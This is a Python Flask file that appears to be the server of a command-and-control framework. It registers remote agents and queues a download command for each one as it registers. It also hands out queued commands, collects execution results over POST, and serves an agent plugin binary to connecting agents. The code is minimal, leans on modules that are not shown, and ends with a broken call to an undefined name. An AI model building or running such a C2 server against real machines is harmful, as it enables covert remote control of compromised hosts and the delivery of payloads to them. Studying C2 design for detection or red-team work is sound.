from flask import Flask, send_file, request
from utils import genAgentID
from DEF_C2 import AgentConnection, AgentCommand

app = Flask(__name__)


agents={}

@app.route("/register")
def register_agent():
    id=genAgentID()
    AC = AgentConnection(id)
    AC.command_queue.append(AgentCommand(AgentCommand.DOWNLOAD,"123"))
    agents[id]=AC
    
    return {"id" : id}

@app.route("/command/<agent_id>")
def command_for_agent(agent_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    return agents[agent_id].serve_cmd()

@app.route("/results/<agent_id>/<execution_id>", methods=['POST'])
def results_from_agent(agent_id,execution_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    if execution_id not in agents[agent_id].results:
        return {"error":"Execution ID Not found"}, 400
    data = request.get_json()
    if ("plugin" not in data) or ("result" not in data):
        return {"error":"invalid parameters"}, 400
    agents[agent_id].results[execution_id] = data
    return data


    



@app.route("/plugin")
def serve_plugin():
    request.args.get('user')
    return send_file("dist/agentplugin_example")

if __name__ == '__main__':

    app.run()
    input(hello)